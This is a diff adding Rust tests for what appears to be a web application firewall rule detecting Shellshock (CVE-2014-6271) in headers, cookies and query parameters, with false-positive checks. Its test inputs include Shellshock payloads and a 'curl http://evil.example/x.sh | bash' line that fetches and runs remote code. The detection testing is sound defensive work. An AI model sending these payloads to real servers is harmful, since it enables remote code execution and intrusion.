@@ -236,6 +236,89 @@ fn rce_emits_critical_severity_for_substitution() {
     }
 }
 
+// ── F-3: Shellshock ─────────────────────────────────────────────────────────────
+
+fn with_header(name: &str, value: &str) -> RequestContext {
+    let mut c = base_ctx();
+    c.normalized.headers = vec![(name.to_string(), value.to_string())];
+    c
+}
+
+fn with_cookie(name: &str, value: &str) -> RequestContext {
+    let mut c = base_ctx();
+    c.normalized.cookies = vec![(name.to_string(), value.to_string())];
+    c
+}
+
+#[test]
+fn rce_shellshock_user_agent_detected() {
+    // The classic CVE-2014-6271 vector: UA is deny-listed for general inspection but
+    // the dedicated single-pattern scan catches it.
+    let d = make_rce().inspect(&with_header("user-agent", "() { :;}; echo vulnerable"));
+    let it = match &d {
+        Decision::Scores(items) => items.iter().find(|i| i.rule_id == "rce-shellshock"),
+        _ => None,
+    };
+    assert_eq!(it.map(|i| i.severity), Some(Severity::Critical), "got: {d:?}");
+}
+
+#[test]
+fn rce_shellshock_cookie_detected() {
+    // The parsed-cookie channel is already scanned by the main set — no special handling.
+    let d = make_rce().inspect(&with_cookie("m", "() { :"));
+    assert!(scores_contains(&d, "rce-shellshock"), "got: {d:?}");
+}
+
+#[test]
+fn rce_shellshock_referer_detected() {
+    let d = make_rce().inspect(&with_header("referer", "() { :;}; echo vulnerable"));
+    assert!(scores_contains(&d, "rce-shellshock"), "got: {d:?}");
+}
+
+#[test]
+fn rce_shellshock_query_param_detected() {
+    let d = make_rce().inspect(&with_query(&[("x", "() { :;}; id")]));
+    assert!(scores_contains(&d, "rce-shellshock"), "got: {d:?}");
+}
+
+#[test]
+fn rce_shellshock_not_double_counted_across_ua_and_cookie() {
+    // The signature in BOTH the UA and a cookie must still yield a single contribution.
+    let mut c = base_ctx();
+    c.normalized.headers = vec![("user-agent".to_string(), "() { :;}".to_string())];
+    c.normalized.cookies = vec![("m".to_string(), "() { :".to_string())];
+    match make_rce().inspect(&c) {
+        Decision::Scores(items) => {
+            let n = items.iter().filter(|i| i.rule_id == "rce-shellshock").count();
+            assert_eq!(n, 1, "rce-shellshock emitted {n} times: {items:?}");
+        }
+        other => panic!("expected Scores, got {other:?}"),
+    }
+}
+
+#[test]
+fn rce_shellshock_no_fp_on_minified_js() {
+    // `function(){}` — an identifier precedes the empty parens, so the boundary-anchored
+    // pattern must NOT match (the whole reason for the tightening).
+    let d = make_rce().inspect(&with_query(&[("cb", "handler=function(){}")]));
+    assert!(!scores_contains(&d, "rce-shellshock"), "false positive on minified JS: {d:?}");
+}
+
+#[test]
+fn rce_shellshock_no_fp_on_benign_cookie() {
+    let d = make_rce().inspect(&with_cookie("pref", "{a:1}"));
+    assert!(!scores_contains(&d, "rce-shellshock"), "false positive on benign cookie: {d:?}");
+}
+
+#[test]
+fn rce_shellshock_ua_not_scanned_by_other_rules() {
+    // The dedicated UA scan runs ONLY the shellshock pattern — a shell idiom in the UA
+    // that the full RCE set would flag must NOT be picked up here (UA stays deny-listed
+    // for general inspection; only the tight shellshock pattern reads it).
+    let d = make_rce().inspect(&with_header("user-agent", "curl http://evil.example/x.sh | bash"));
+    assert!(matches!(d, Decision::Allow), "UA leaked into the general RCE set: {d:?}");
+}
+
 // ── pipeline integration / cumulative scoring ──────────────────────────────────
 
 #[test]
